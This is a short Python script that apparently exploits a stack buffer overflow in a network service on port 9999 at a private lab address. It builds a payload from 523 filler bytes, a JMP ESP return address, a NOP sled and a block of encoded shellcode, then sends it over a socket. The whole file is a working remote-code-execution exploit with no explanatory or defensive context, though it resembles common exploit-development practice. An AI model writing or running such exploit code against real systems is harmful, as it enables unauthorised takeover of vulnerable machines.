#!/usr/bin/python
import socket

target_address="192.168.56.102"
target_port=9999



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buf =  ""
buf += "\xdb\xd2\xba\xd4\xb1\x26\xe8\xd9\x74\x24\xf4\x5e\x2b"
buf += "\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x3a\x4d\xc4"
buf += "\x1d\x3e\x46\x8b\xde\xbe\x97\xec\x57\x5b\xa6\x2c\x03"
buf += "\x28\x99\x9c\x47\x7c\x16\x56\x05\x94\xad\x1a\x82\x9b"
buf += "\x06\x90\xf4\x92\x97\x89\xc5\xb5\x1b\xd0\x19\x15\x25"
buf += "\x1b\x6c\x54\x62\x46\x9d\x04\x3b\x0c\x30\xb8\x48\x58"
buf += "\x89\x33\x02\x4c\x89\xa0\xd3\x6f\xb8\x77\x6f\x36\x1a"
buf += "\x76\xbc\x42\x13\x60\xa1\x6f\xed\x1b\x11\x1b\xec\xcd"
buf += "\x6b\xe4\x43\x30\x44\x17\x9d\x75\x63\xc8\xe8\x8f\x97"
buf += "\x75\xeb\x54\xe5\xa1\x7e\x4e\x4d\x21\xd8\xaa\x6f\xe6"
buf += "\xbf\x39\x63\x43\xcb\x65\x60\x52\x18\x1e\x9c\xdf\x9f"
buf += "\xf0\x14\x9b\xbb\xd4\x7d\x7f\xa5\x4d\xd8\x2e\xda\x8d"
buf += "\x83\x8f\x7e\xc6\x2e\xdb\xf2\x85\x26\x28\x3f\x35\xb7"
buf += "\x26\x48\x46\x85\xe9\xe2\xc0\xa5\x62\x2d\x17\xc9\x58"
buf += "\x89\x87\x34\x63\xea\x8e\xf2\x37\xba\xb8\xd3\x37\x51"
buf += "\x38\xdb\xed\xf6\x68\x73\x5e\xb7\xd8\x33\x0e\x5f\x32"
buf += "\xbc\x71\x7f\x3d\x16\x1a\xea\xc4\xf1\xe5\x43\xfe\x66"
buf += "\x8e\x91\xfe\x3d\x27\x1f\x18\xd7\xa7\x49\xb3\x40\x51"
buf += "\xd0\x4f\xf0\x9e\xce\x2a\x32\x14\xfd\xcb\xfd\xdd\x88"
buf += "\xdf\x6a\x2e\xc7\xbd\x3d\x31\xfd\xa9\xa2\xa0\x9a\x29"
buf += "\xac\xd8\x34\x7e\xf9\x2f\x4d\xea\x17\x09\xe7\x08\xea"
buf += "\xcf\xc0\x88\x31\x2c\xce\x11\xb7\x08\xf4\x01\x01\x90"
buf += "\xb0\x75\xdd\xc7\x6e\x23\x9b\xb1\xc0\x9d\x75\x6d\x8b"
buf += "\x49\x03\x5d\x0c\x0f\x0c\x88\xfa\xef\xbd\x65\xbb\x10"
buf += "\x71\xe2\x4b\x69\x6f\x92\xb4\xa0\x2b\xa2\xfe\xe8\x1a"
buf += "\x2b\xa7\x79\x1f\x36\x58\x54\x5c\x4f\xdb\x5c\x1d\xb4"
buf += "\xc3\x15\x18\xf0\x43\xc6\x50\x69\x26\xe8\xc7\x8a\x63"

junk = 'A' * 523 + '\n'
jmpesp = '\x4f\xb2\x2e\x66' # some .dll I forgot
buffer =  junk + jmpesp + ('\x90' * 50) +buf
try:
	sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=sock.connect((target_address,target_port))
	sock.send(buffer)
	sock.close()
	print "Done!"
except:
	print "Could not connect"

